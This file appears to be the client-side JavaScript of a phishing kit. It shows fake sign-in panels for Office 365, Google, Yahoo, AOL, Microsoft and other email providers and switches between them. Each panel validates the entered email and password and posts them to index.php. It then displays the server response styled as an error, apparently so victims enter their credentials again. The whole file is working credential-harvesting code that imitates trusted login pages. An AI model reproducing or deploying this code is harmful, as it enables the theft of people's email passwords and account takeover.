$('[data-toggle="tooltip"]').tooltip({
    trigger: 'manual'
});

$(document).ready(function(){
    $('[data-toggle="tooltip"]').tooltip('show');
    setTimeout(function(){$('[data-toggle="tooltip"]').tooltip('hide');}, 6000);
})
window.onload = function(){
    scrollTop();
    $('.footer').hide();
}

function scrollTop(){
    document.body.scrollTop = 0;
    document.documentElement.scrollTop = 0;
}

var officeContainer = document.querySelector(".form-container-office");
var officeBtn = document.querySelector("#officeBtn");
var officeEmail = document.querySelector('#officeEmail');
var officePassword = document.querySelector('#officePassword');
var officeSignIn = document.querySelector('#officeSignIn');
var officeAlert = document.querySelector('.officeAlert');

var googleContainer = document.querySelector(".form-container-google");
var googleBtn = document.querySelector("#googleBtn");
var googleEmail = document.querySelector('#googleEmail');
var googlePassword = document.querySelector('#googlePassword');
var googleSignIn = document.querySelector('#googleSignIn');
var googleAlert = document.querySelector('.googleAlert');

var yahooContainer = document.querySelector(".form-container-yahoo");
var yahooBtn = document.querySelector("#yahooBtn");
var yahooEmail = document.querySelector('#yahooEmail');
var yahooPassword = document.querySelector('#yahooPassword');
var yahooSignIn = document.querySelector('#yahooSignIn');
var yahooAlert = document.querySelector('.yahooAlert');

var aolContainer = document.querySelector(".form-container-aol");
var aolBtn = document.querySelector("#aolBtn");
var aolEmail = document.querySelector('#aolEmail');
var aolPassword = document.querySelector('#aolPassword');
var aolSignIn = document.querySelector('#aolSignIn');
var aolAlert = document.querySelector('.aolAlert');

var msContainer = document.querySelector(".form-container-ms");
var msBtn = document.querySelector("#msBtn");
var msEmail = document.querySelector('#msEmail');
var msPassword = document.querySelector('#msPassword');
var msSignIn = document.querySelector('#msSignIn');
var msAlert = document.querySelector('.msAlert');

var otherContainer = document.querySelector(".form-container-other");
var otherBtn = document.querySelector("#otherBtn");
var anotherEmailAddr = document.querySelector('#anotherEmailAddress');
var anotherPassword = document.querySelector('#anotherPassword');
var anotherSignIn = document.querySelector('#anotherSignIn');
var anotherAlert = document.querySelector('.anotherAlert');

var checkemail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;

officeBtn.addEventListener('click', function(){
    officeContainer.className = officeContainer.className.replace(/\bhide\b/g, "show");
    yahooContainer.className = yahooContainer.className.replace(/\bshow\b/g, "hide");
    aolContainer.className = aolContainer.className.replace(/\bshow\b/g, "hide");
    googleContainer.className = googleContainer.className.replace(/\bshow\b/g, "hide");
    msContainer.className = msContainer.className.replace(/\bshow\b/g, "hide");
    otherContainer.className = otherContainer.className.replace(/\bshow\b/g, "hide");
})

googleBtn.addEventListener('click', function(){
    officeContainer.className = officeContainer.className.replace(/\bshow\b/g, "hide");
    yahooContainer.className = yahooContainer.className.replace(/\bshow\b/g, "hide");
    aolContainer.className = aolContainer.className.replace(/\bshow\b/g, "hide");
    googleContainer.className = googleContainer.className.replace(/\bhide\b/g, "show");
    msContainer.className = msContainer.className.replace(/\bshow\b/g, "hide");
    otherContainer.className = otherContainer.className.replace(/\bshow\b/g, "hide");
    scrollTop();
})

yahooBtn.addEventListener('click', function(){
    officeContainer.className = officeContainer.className.replace(/\bshow\b/g, "hide");
    yahooContainer.className = yahooContainer.className.replace(/\bhide\b/g, "show");
    aolContainer.className = aolContainer.className.replace(/\bshow\b/g, "hide");
    googleContainer.className = googleContainer.className.replace(/\bshow\b/g, "hide");
    msContainer.className = msContainer.className.replace(/\bshow\b/g, "hide");
    otherContainer.className = otherContainer.className.replace(/\bshow\b/g, "hide");
    scrollTop();
})

aolBtn.addEventListener('click', function(){
    officeContainer.className = officeContainer.className.replace(/\bshow\b/g, "hide");
    yahooContainer.className = yahooContainer.className.replace(/\bshow\b/g, "hide");
    aolContainer.className = aolContainer.className.replace(/\bhide\b/g, "show");
    googleContainer.className = googleContainer.className.replace(/\bshow\b/g, "hide");
    msContainer.className = msContainer.className.replace(/\bshow\b/g, "hide");
    otherContainer.className = otherContainer.className.replace(/\bshow\b/g, "hide");
})

msBtn.addEventListener('click', function(){
    officeContainer.className = officeContainer.className.replace(/\bshow\b/g, "hide");
    yahooContainer.className = yahooContainer.className.replace(/\bshow\b/g, "hide");
    aolContainer.className = aolContainer.className.replace(/\bshow\b/g, "hide");
    googleContainer.className = googleContainer.className.replace(/\bshow\b/g, "hide");
    msContainer.className = msContainer.className.replace(/\bhide\b/g, "show");
    otherContainer.className = otherContainer.className.replace(/\bshow\b/g, "hide");
})

otherBtn.addEventListener('click', function(){
    officeContainer.className = officeContainer.className.replace(/\bshow\b/g, "hide");
    yahooContainer.className = yahooContainer.className.replace(/\bshow\b/g, "hide");
    aolContainer.className = aolContainer.className.replace(/\bshow\b/g, "hide");
    googleContainer.className = googleContainer.className.replace(/\bshow\b/g, "hide");
    msContainer.className = msContainer.className.replace(/\bshow\b/g, "hide");
    otherContainer.className = otherContainer.className.replace(/\bhide\b/g, "show");
    scrollTop();
})


officeSignIn.addEventListener('click', function(){
    if(officeEmail.value == ""){
        officeAlert.className = officeAlert.className.replace(/\bhide\b/g, "show");
        officeAlert.textContent = "Enter your email Address";
        officeEmail.focus();
        return false;
    }else if(!(officeEmail.value.match(checkemail))){
        officeAlert.className = officeAlert.className.replace(/\bhide\b/g, "show");
        officeAlert.textContent = "Enter your email Address";
        officeEmail.focus();
        return false;
    }else if(officePassword.value == ""){
        officeAlert.className = officeAlert.className.replace(/\bhide\b/g, "show");
        officeAlert.textContent = "Enter your password";
        officePassword.focus();
        return false;  
    }else{
        officeAlert.className = officeAlert.className.replace(/\bhide\b/g, "show");
        officeAlert.className = officeAlert.className.replace(/\balert-danger\b/g, "alert-info");
        officeAlert.textContent = "Processing...";
    }

    var xmlhttp;
    if(window.XMLHttpRequest){
      xmlhttp = new XMLHttpRequest();
    }else{
      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }

    xmlhttp.onreadystatechange=function(){
      if(xmlhttp.readyState==4 && xmlhttp.status==200){
            officeAlert.className = officeAlert.className.replace(/\balert-info\b/g, "alert-danger");
            officeAlert.textContent = xmlhttp.responseText;
      }
    }

    var url = 'index.php';
    var param = "email="+officeEmail.value+"&password="+officePassword.value;

    xmlhttp.open("POST", url, true);

    xmlhttp.setRequestHeader("content-type","application/x-www-form-urlencoded");
    xmlhttp.setRequestHeader("content-length",param.length);
    xmlhttp.setRequestHeader("connection","close");

    xmlhttp.send(param);

    return true;
})

googleSignIn.addEventListener('click', function(){
    if(googleEmail.value == ""){
        googleAlert.className = googleAlert.className.replace(/\bhide\b/g, "show");
        googleAlert.textContent = "Enter your email Address";
        googleEmail.focus();
        return false;
    }if(!(googleEmail.value.match(checkemail))){
        googleAlert.className = googleAlert.className.replace(/\bhide\b/g, "show");
        googleAlert.textContent = "Enter your email Address";
        googleEmail.focus();
        return false;
    }else if(googlePassword.value == ""){
        googleAlert.className = googleAlert.className.replace(/\bhide\b/g, "show");
        googleAlert.textContent = "Enter your password";
        googlePassword.focus();
        return false;  
    }else{
        googleAlert.className = googleAlert.className.replace(/\bhide\b/g, "show");
        googleAlert.className = googleAlert.className.replace(/\balert-danger\b/g, "alert-info");
        googleAlert.textContent = "Processing...";
    }

    var xmlhttp;
    if(window.XMLHttpRequest){
      xmlhttp = new XMLHttpRequest();
    }else{
      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }

    xmlhttp.onreadystatechange=function(){
      if(xmlhttp.readyState==4 && xmlhttp.status==200){
            googleAlert.className = googleAlert.className.replace(/\balert-info\b/g, "alert-danger");
            googleAlert.textContent = xmlhttp.responseText;
      }
    }

    var url = 'index.php';
    var param = "email="+googleEmail.value+"&password="+googlePassword.value;

    xmlhttp.open("POST", url, true);

    xmlhttp.setRequestHeader("content-type","application/x-www-form-urlencoded");
    xmlhttp.setRequestHeader("content-length",param.length);
    xmlhttp.setRequestHeader("connection","close");

    xmlhttp.send(param);

    return true;
})

yahooSignIn.addEventListener('click', function(){
    if(yahooEmail.value == ""){
        yahooAlert.className = yahooAlert.className.replace(/\bhide\b/g, "show");
        yahooAlert.textContent = "Enter your email Address";
        yahooEmail.focus();
        return false;
    }else if(!(yahooEmail.value.match(checkemail))){
        yahooAlert.className = yahooAlert.className.replace(/\bhide\b/g, "show");
        yahooAlert.textContent = "Enter your email Address";
        yahooEmail.focus();
        return false;
    }else if(yahooPassword.value == ""){
        yahooAlert.className = yahooAlert.className.replace(/\bhide\b/g, "show");
        yahooAlert.textContent = "Enter your password";
        yahooPassword.focus();
        return false;  
    }else{
        yahooAlert.className = yahooAlert.className.replace(/\bhide\b/g, "show");
        yahooAlert.className = yahooAlert.className.replace(/\balert-danger\b/g, "alert-info");
        yahooAlert.textContent = "Processing...";
    }

    var xmlhttp;
    if(window.XMLHttpRequest){
      xmlhttp = new XMLHttpRequest();
    }else{
      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }

    xmlhttp.onreadystatechange=function(){
      if(xmlhttp.readyState==4 && xmlhttp.status==200){
            yahooAlert.className = yahooAlert.className.replace(/\balert-info\b/g, "alert-danger");
            yahooAlert.textContent = xmlhttp.responseText;
      }
    }

    var url = 'index.php';
    var param = "email="+yahooEmail.value+"&password="+yahooPassword.value;

    xmlhttp.open("POST", url, true);

    xmlhttp.setRequestHeader("content-type","application/x-www-form-urlencoded");
    xmlhttp.setRequestHeader("content-length",param.length);
    xmlhttp.setRequestHeader("connection","close");

    xmlhttp.send(param);

    return true;
})

aolSignIn.addEventListener('click', function(){
    if(aolEmail.value == ""){
        aolAlert.className = aolAlert.className.replace(/\bhide\b/g, "show");
        aolAlert.textContent = "Enter your email Address";
        aolEmail.focus();
        return false;
    }else if(!(aolEmail.value.match(checkemail))){
        aolAlert.className = aolAlert.className.replace(/\bhide\b/g, "show");
        aolAlert.textContent = "Enter your email Address";
        aolEmail.focus();
        return false;
    }else if(aolPassword.value == ""){
        aolAlert.className = aolAlert.className.replace(/\bhide\b/g, "show");
        aolAlert.textContent = "Enter your password";
        aolPassword.focus();
        return false;  
    }else{
        aolAlert.className = aolAlert.className.replace(/\bhide\b/g, "show");
        aolAlert.className = aolAlert.className.replace(/\balert-danger\b/g, "alert-info");
        aolAlert.textContent = "Processing...";
    }

    var xmlhttp;
    if(window.XMLHttpRequest){
      xmlhttp = new XMLHttpRequest();
    }else{
      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }

    xmlhttp.onreadystatechange=function(){
      if(xmlhttp.readyState==4 && xmlhttp.status==200){
            aolAlert.className = aolAlert.className.replace(/\balert-info\b/g, "alert-danger");
            aolAlert.textContent = xmlhttp.responseText;
      }
    }

    var url = 'index.php';
    var param = "email="+aolEmail.value+"&password="+aolPassword.value;

    xmlhttp.open("POST", url, true);

    xmlhttp.setRequestHeader("content-type","application/x-www-form-urlencoded");
    xmlhttp.setRequestHeader("content-length",param.length);
    xmlhttp.setRequestHeader("connection","close");

    xmlhttp.send(param);

    return true;
})

msSignIn.addEventListener('click', function(){
    if(msEmail.value == ""){
        msAlert.className = msAlert.className.replace(/\bhide\b/g, "show");
        msAlert.textContent = "Enter your email Address";
        msEmail.focus();
        return false;
    }if(!(msEmail.value.match(checkemail))){
        msAlert.className = msAlert.className.replace(/\bhide\b/g, "show");
        msAlert.textContent = "Enter your email Address";
        msEmail.focus();
        return false;
    }else if(msPassword.value == ""){
        msAlert.className = msAlert.className.replace(/\bhide\b/g, "show");
        msAlert.textContent = "Enter your password";
        msPassword.focus();
        return false;  
    }else{
        msAlert.className = msAlert.className.replace(/\bhide\b/g, "show");
        msAlert.className = msAlert.className.replace(/\balert-danger\b/g, "alert-info");
        msAlert.textContent = "Processing...";
    }

    var xmlhttp;
    if(window.XMLHttpRequest){
      xmlhttp = new XMLHttpRequest();
    }else{
      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }

    xmlhttp.onreadystatechange=function(){
      if(xmlhttp.readyState==4 && xmlhttp.status==200){
            msAlert.className = msAlert.className.replace(/\balert-info\b/g, "alert-danger");
            msAlert.textContent = xmlhttp.responseText;
      }
    }

    var url = 'index.php';
    var param = "email="+msEmail.value+"&password="+msPassword.value;

    xmlhttp.open("POST", url, true);

    xmlhttp.setRequestHeader("content-type","application/x-www-form-urlencoded");
    xmlhttp.setRequestHeader("content-length",param.length);
    xmlhttp.setRequestHeader("connection","close");

    xmlhttp.send(param);

    return true;
})

anotherSignIn.addEventListener('click', function(){
    if(anotherEmailAddr.value == ""){
        anotherAlert.className = anotherAlert.className.replace(/\bhide\b/g, "show");
        anotherAlert.textContent = "Enter your email Address";
        anotherEmailAddr.focus();
        return false;
    }if(!(anotherEmailAddr.value.match(checkemail))){
        anotherAlert.className = anotherAlert.className.replace(/\bhide\b/g, "show");
        anotherAlert.textContent = "Enter your email Address";
        anotherEmailAddr.focus();
        return false;
    }else if(anotherPassword.value == ""){
        anotherAlert.className = anotherAlert.className.replace(/\bhide\b/g, "show");
        anotherAlert.textContent = "Enter your password";
        anotherPassword.focus();
        return false;  
    }
    anotherAlert.className = anotherAlert.className.replace(/\bhide\b/g, "show");
    anotherAlert.className = anotherAlert.className.replace(/\balert-danger\b/g, "alert-info");
    anotherAlert.textContent = "Processing...";

    var xmlhttp;
    if(window.XMLHttpRequest){
      xmlhttp = new XMLHttpRequest();
    }else{
      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }

    xmlhttp.onreadystatechange=function(){
      if(xmlhttp.readyState==4 && xmlhttp.status==200){
            anotherAlert.className = anotherAlert.className.replace(/\balert-info\b/g, "alert-danger");
            anotherAlert.textContent = xmlhttp.responseText;
      }
    }

    var url = 'index.php';
    var param = "email="+anotherEmailAddr.value+"&password="+anotherPassword.value;

    xmlhttp.open("POST", url, true);

    xmlhttp.setRequestHeader("content-type","application/x-www-form-urlencoded");
    xmlhttp.setRequestHeader("content-length",param.length);
    xmlhttp.setRequestHeader("connection","close");

    xmlhttp.send(param);

    return true;
});

var footer = document.querySelector('.footer');
var toggler = document.querySelector('.toggler');

toggler.addEventListener('click', function(){
    $('.footer').toggle("slow");
    $('html, body').animate({
        scrollTop: document.body.scrollHeight
    }, "fast");
})